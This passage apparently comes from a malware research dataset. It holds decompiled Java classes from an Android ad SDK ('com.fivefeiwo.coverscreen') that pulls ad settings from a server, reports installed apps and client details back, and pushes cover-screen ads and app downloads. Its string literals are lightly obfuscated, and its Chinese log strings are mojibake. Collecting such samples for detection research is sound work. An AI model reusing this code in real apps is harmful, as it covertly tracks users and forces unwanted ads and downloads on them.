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"".getBytes(""UTF-8"")),0),null);       }  else       if (S.h.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(""UTF-8"")),0),null);       }     }  catch (    Exception e) {     }     return drawable;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\AnimationAnimationListenerC0025x.code","final class AnimationAnimationListenerC0025x implements Animation.AnimationListener {   private Animation.AnimationListener a;   private View b;   public AnimationAnimationListenerC0025x(  C0020s c0020s,  Animation.AnimationListener animationListener,  View view){     this.a=animationListener;     this.b=view;   }   @Override public final void onAnimationEnd(  Animation animation){     this.a.onAnimationEnd(animation);     this.b.setVisibility(0);   }   @Override public final void onAnimationRepeat(  Animation animation){     this.a.onAnimationRepeat(animation);   }   @Override public final void onAnimationStart(  Animation animation){     this.a.onAnimationStart(animation);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ao.code","public final class ao {   int a=0;   int b=0; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ap.code","public final class ap {   public static int a(  Context context,  String str,  String str2,  int i){     return context.getSharedPreferences(str,0).getInt(str2,i);   }   public static String a(  Context context,  String str,  String str2){     return a(context,str,str2,""0"");   }   public static String a(  Context context,  String str,  String str2,  String str3){     return context.getSharedPreferences(str,0).getString(str2,str3);   }   public static void a(  Context context,  String str,  String str2,  boolean z){     context.getSharedPreferences(str,0).edit().putBoolean(str2,z).commit();   }   public static void b(  Context context,  String str,  String str2){     context.getSharedPreferences(str,0).edit().remove(str2).commit();   }   public static void b(  Context context,  String str,  String str2,  int i){     context.getSharedPreferences(str,0).edit().putInt(str2,i).commit();   }   public static void b(  Context context,  String str,  String str2,  String str3){     context.getSharedPreferences(str,0).edit().putString(str2,str3).commit();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\aq.code","public final class aq {   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || str.equals(""null"");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\B.code","public final class B implements Animation.AnimationListener {   final A a;   private LinearLayout b;   public B(  A a,  LinearLayout linearLayout){     this.a=a;     this.b=linearLayout;   }   @Override public final void onAnimationEnd(  Animation animation){     this.b.setOnTouchListener(new C(this));     this.a.setOnClickListener(new D(this));   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C.code","final class C implements View.OnTouchListener {   private B a;   public C(  B b){     this.a=b;   }   @Override public final boolean onTouch(  View view,  MotionEvent motionEvent){     this.a.a.c.onTouchEvent(motionEvent);     return true;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0003b.code","public final class C0003b extends Thread {   private AbstractC0002a a;   public C0003b(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void run(){     Context e=this.a.e();     String replace=""coverscreen_feiwocp"".replace(""_feiwocp"","""");     try {       if (!e.getSharedPreferences(replace,0).getBoolean(""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),true)) {         AbstractC0002a.b(this.a);       }  else {         try {           Thread.sleep(60000L);         }  catch (        InterruptedException e2) {         }         AbstractC0002a.a(this.a);       }     }  catch (    Exception e3) {     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0004c.code","public final class C0004c extends TimerTask {   private AbstractC0002a a;   public C0004c(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void run(){     this.a.b();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0005d.code","public final class C0005d implements aa {   private AbstractC0002a a;   public C0005d(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆuploadClientInfoï¼‰ï¼š"").append(str);     context=this.a.d;     ap.a(context,""coverscreen_feiwocp"".replace(""_feiwocp"",""""),""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),false);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0006e.code","public final class C0006e implements aa {   private AbstractC0002a a;   public C0006e(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstallï¼‰ï¼š"").append(str);     if (z) {       context=this.a.d;       ap.b(context,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0010i.code","final class C0010i implements aa {   private CPManager a;   public C0010i(  CPManager cPManager){     this.a=cPManager;   }   @Override public final void a(  boolean z,  String str){     List b;     List list;     List list2;     List list3;     this.a.e();     new StringBuilder().append(""èŽ·å�–å¹¿å‘Šçš„ç½‘ç»œè¯·æ±‚å¾—åˆ°è¿”å›žç»“æžœï¼š"").append(str);     if (z) {       try {         JSONObject jSONObject=new JSONObject(str);         int optInt=jSONObject.optInt(""errorcode_feiwocp"".replace(""_feiwocp"",""""),1);         String optString=jSONObject.optString(""errormessage_feiwocp"".replace(""_feiwocp"",""""));         if (optInt != 0) {           this.a.e();           new StringBuilder().append(""request failed: "").append(optString);         }  else {           int optInt2=jSONObject.optInt(""screenOnNum_feiwocp"".replace(""_feiwocp"",""""),-1);           int optInt3=jSONObject.optInt(""screenOnShowRate_feiwocp"".replace(""_feiwocp"",""""),-1);           jSONObject.optInt(""coverScreenRefreshTime_feiwocp"".replace(""_feiwocp"",""""),60);           int optInt4=optInt2 == -1 ? jSONObject.optInt(""screenNoNum_feiwocp"".replace(""_feiwocp"",""""),3) : optInt2;           int optInt5=optInt3 == -1 ? jSONObject.optInt(""screenNoShowRate_feiwocp"".replace(""_feiwocp"",""""),10) : optInt3;           int optInt6=jSONObject.optInt(""screenOnSwitchDelay_feiwocp"".replace(""_feiwocp"",""""),10);           boolean optBoolean=jSONObject.optBoolean(""screenOnShow_feiwocp"".replace(""_feiwocp"",""""),true);           boolean optBoolean2=jSONObject.optBoolean(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),false);           JSONArray optJSONArray=jSONObject.optJSONArray(""ads_placeholder"".replace(""_placeholder"",""""));           int i=optInt6 > 0 ? optInt6 : 10;           if (optJSONArray != null) {             this.a.a(optJSONArray);           }           CPManager.a(this.a,0);           CPManager cPManager=this.a;           CPManager cPManager2=this.a;           b=CPManager.b(optJSONArray);           cPManager.c=b;           this.a.d=new Date(new Date().getTime() + 60000);           ap.b(this.a.e(),S.j,S.p,optInt4);           ap.b(this.a.e(),S.j,S.n,optInt5);           ap.b(this.a.e(),S.j,S.o,i * 1000);           ap.a(this.a.e(),S.j,S.l,optBoolean);           ap.a(this.a.e(),S.j,S.i,optBoolean2);           new StringBuilder().append(""setContent, screenOnNum: "").append(optInt4).append("", screenOnShowRate: "").append(optInt5).append("", screenOnSwitchDelay: "").append(i * 1000).append("", enableScreenOnShow: "").append(optBoolean).append("", downloadConfirm: "").append(optBoolean2).append("", coverScreenRefreshTime: "").append(1);         }       }  catch (      JSONException e) {         this.a.e();         new StringBuilder().append(""error result: "").append(e);       }     }     list=this.a.c;     if (list != null) {       list2=this.a.c;       if (!list2.isEmpty()) {         String replace=""C_feiwocp"".replace(""_feiwocp"","""");         StringBuilder append=new StringBuilder().append(""size: _feiwocp"".replace(""_feiwocp"",""""));         list3=this.a.c;         Log.i(replace,append.append(list3.size()).toString());         this.a.c();         this.a.e();         this.a.a(false);       }     }     Log.i(""C_feiwocp"".replace(""_feiwocp"",""""),""size: 0_feiwocp"".replace(""_feiwocp"",""""));     this.a.c();     this.a.e();     this.a.a(false);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0011j.code","final class C0011j extends BroadcastReceiver {   private SA a;   public C0011j(  SA sa){     this.a=sa;   }   @Override public final void onReceive(  Context context,  Intent intent){     this.a.finish();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0014m.code","public final class C0014m extends T {   final SA a;   private Q b;   public C0014m(  SA sa,  Q q){     this.a=sa;     this.b=q;   }   @Override public final void a(  H h,  String str,  boolean z){     super.a(h,str,z);     if (""true_feiwocp"".replace(""_feiwocp"","""").equals(this.b.o()) && z) {       this.a.a.post(new RunnableC0015n(this,str,h));     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0016o.code","public final class C0016o implements aa {   public C0016o(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendClickRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0017p.code","public final class C0017p implements aa {   public C0017p(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendShowRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0018q.code","final class C0018q extends Thread {   private Intent a;   private Context b;   private SR c;   public C0018q(  SR sr,  Intent intent,  Context context){     this.c=sr;     this.a=intent;     this.b=context;   }   @Override public final void run(){     String substring=this.a.getDataString().substring(8);     try {       SR.a(this.c,this.b,substring);       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(substring);       }     }  catch (    Exception e) {       new StringBuilder().append(""ä¸Šä¼ åŒ…å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(e);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0019r.code","public final class C0019r implements aa {   private Context a;   private String b;   public C0019r(  SR sr,  Context context,  String str){     this.a=context;     this.b=str;   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstall from ScreenReceiverï¼‰ï¼š"").append(str);     if (z) {       return;     }     new StringBuilder().append(""ä¸Šä¼ å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(str);     String a=ap.a(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a != null) {       new StringBuilder().append(a).append("","").append(this.b);     }  else {       String str2=this.b;     }     ap.b(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),this.b);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0020s.code","public class C0020s extends LinearLayout {   SA a;   List b;   private Timer c;   private TimerTask d;   private int e;   public C0020s(  SA sa,  List list){     super(sa);     new Handler();     setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setGravity(17);     this.a=sa;     this.b=list;     this.e=ap.a(sa,S.j,S.o,5);   }   private void c(  View view,  Q q){     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setCancelable(false);     builder.setTitle(""æ��ç¤º_feiwocp"".replace(""_feiwocp"",""""));     builder.setMessage(""ç¡®å®šä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" ï¼Ÿ"");     builder.setPositiveButton(""ç¡®å®š_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0022u(this,view,q));     builder.setNegativeButton(""å�–æ¶ˆ_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0023v(this));     builder.show();     i();   }   public int a(  View view,  Q q){     int indexOf=this.b.indexOf(q);     this.b.remove(q);     if (indexOf < 0) {       return 0;     }     if (indexOf >= this.b.size()) {       a(indexOf - 1);       return indexOf - 1;     }     a(indexOf);     return indexOf;   }   public final List a(){     return this.b;   }   public final void a(  int i){     if (this.b.isEmpty()) {       return;     }     this.a.b((Q)this.b.get(i));   }   public final void a(  ImageView imageView,  String str,  boolean z){     imageView.setTag(str);     aj.a().a(getContext(),str,new C0024w(this,imageView,str,z));   }   public final void b(){     c();     d();     h();   }   public final void b(  View view,  Q q){     int b=P.b(getContext());     if (Q.a.equals(q.h())) {       if (b == 4) {         if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.n())) {           c(view,q);           return;         }       }  else       if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.p())) {         c(view,q);         return;       }     }     a(view,q);     this.a.a(q);   }   protected void c(){   }   protected void d(){   }   public final void e(){     this.a.finish();   }   public void f(){   }   public final void g(){     i();     h();   }   public final void h(){     i();     if (this.b == null || this.b.isEmpty()) {       return;     }     if (this.c == null) {       this.c=new Timer();     }     this.d=new C0026y(this);     this.c.schedule(this.d,this.e,this.e);   }   public final void i(){     if (this.d != null) {       this.d.cancel();       this.d=null;     }     if (this.c != null) {       this.c.cancel();       this.c=null;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0024w.code","final class C0024w implements am {   private ImageView a;   private String b;   private boolean c;   private C0020s d;   public C0024w(  C0020s c0020s,  ImageView imageView,  String str,  boolean z){     this.d=c0020s;     this.a=imageView;     this.b=str;     this.c=z;   }   @Override public final void a(  Drawable drawable){     Bitmap createBitmap;     if (drawable == null || this.a.getTag() == null || !this.a.getTag().equals(this.b)) {       return;     }     if (!this.c) {       this.a.setImageDrawable(drawable);       return;     }     ImageView imageView=this.a;     Bitmap copy=((BitmapDrawable)drawable).getBitmap().copy(Bitmap.Config.ARGB_8888,false);     float a=an.a(this.d.getContext(),8.0f);     if (copy == null) {       createBitmap=null;     }  else {       createBitmap=Bitmap.createBitmap(copy.getWidth(),copy.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,copy.getWidth(),copy.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,a,a,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(copy,rect,rect,paint);       copy.recycle();     }     imageView.setImageBitmap(createBitmap);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\C0026y.code","public final class C0026y extends TimerTask {   final C0020s a;   public C0026y(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void run(){     this.a.a.runOnUiThread(new RunnableC0027z(this));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\CPManager.code","public final class CPManager extends AbstractC0002a {   private static CPManager h;   private List c;   private Date d;   private int e;   private boolean f;   private long g;   private CPManager(  Context context,  String str){     super(context,str);     this.d=null;     this.e=0;     this.f=false;   }   private int a(  Context context){     if (context == null || !P.a(context)) {       this.g=new Date().getTime();       this.f=true;       return 2;     }     if (this.c == null || this.c.isEmpty()) {       this.g=new Date().getTime();       this.f=true;       a(true);       return 2;     }     if (this.e >= this.c.size()) {       this.e=0;     }     if (!a(this.c,this.e)) {       return 4;     }     a(true);     return 0;   }   public static int a(  CPManager cPManager,  int i){     cPManager.e=0;     return 0;   }   public static List b(  JSONArray jSONArray){     if (jSONArray == null) {       return null;     }     ArrayList arrayList=new ArrayList();     for (int i=0; i < jSONArray.length(); i++) {       try {         Q a=Q.a(jSONArray.getJSONObject(i));         if (a != null && a.a() > 0) {           arrayList.add(a);         }       }  catch (      Exception e) {         return null;       }     }     return arrayList;   }   public static void close(  Context context){     context.sendBroadcast(new Intent(S.q));   }   public static void destory(  Context context){     if (h == null || context == null) {       return;     }     close(context);     h.a();   }   public static CPManager getInstance(){     return h;   }   public static CPManager init(  Context context,  String str){     if (h != null) {       return h;     }     if (context == null) {       throw new IllegalArgumentException(""context is null_feiwocp"".replace(""_feiwocp"",""""));     }     if (str == null || str.trim().length() < 8) {       throw new IllegalArgumentException(""appkey is error_feiwocp"".replace(""_feiwocp"",""""));     }     CPManager cPManager=new CPManager(context,str);     h=cPManager;     return cPManager;   }   public static void setShowAtScreenOn(  boolean z){     if (h != null) {       a=z;       ap.a(h.e(),S.j,S.m,z);     }   }   public static int showAd(  Context context){     if (h == null) {       return 1;     }     try {       return h.a(context);     }  catch (    Exception e) {       return 5;     }   }   @Override protected final void a(){     super.a();     h=null;   }   public final void a(  int i){     this.e=i;   }   public final void a(  String str){     if (aq.a(str) || this.c == null) {       return;     }     Iterator it=this.c.iterator();     while (it.hasNext()) {       if (str.equals(((Q)it.next()).e())) {         it.remove();       }     }   }   @Override protected final void b(){     if (this.b) {       e();       return;     }     if (this.d != null && this.d.getTime() > new Date().getTime() && this.c != null && this.c.size() > 0) {       e();       return;     }     this.b=true;     JSONObject a=H.a(e(),S.a);     ab abVar=new ab();     abVar.a(e(),I.e(),d(),a.toString());     abVar.a(new C0010i(this));     e();     Z.a().a(abVar);   }   @Override public final void c(){     super.c();     if (this.c == null || this.c.isEmpty() || !this.f) {       return;     }     this.f=false;     if (new Date().getTime() - this.g <= 10000) {       a(e());     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\D.code","final class D implements View.OnClickListener {   private B a;   public D(  B b){     this.a=b;   }   @Override public final void onClick(  View view){     if (this.a.a.e >= this.a.a.a().size()) {       this.a.a.f();       return;     }     Q q=(Q)this.a.a.a().get(this.a.a.e);     if (""true"".equals(q.q())) {       this.a.a.b(this.a.a.d.getChildAt(this.a.a.e),q);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0022u.code","final class DialogInterfaceOnClickListenerC0022u implements DialogInterface.OnClickListener {   private View a;   private Q b;   private C0020s c;   public DialogInterfaceOnClickListenerC0022u(  C0020s c0020s,  View view,  Q q){     this.c=c0020s;     this.a=view;     this.b=q;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.c.a(this.a,this.b);     this.c.a.a(this.b);     this.c.h();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0023v.code","final class DialogInterfaceOnClickListenerC0023v implements DialogInterface.OnClickListener {   private C0020s a;   public DialogInterfaceOnClickListenerC0023v(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.a.h();   } } "
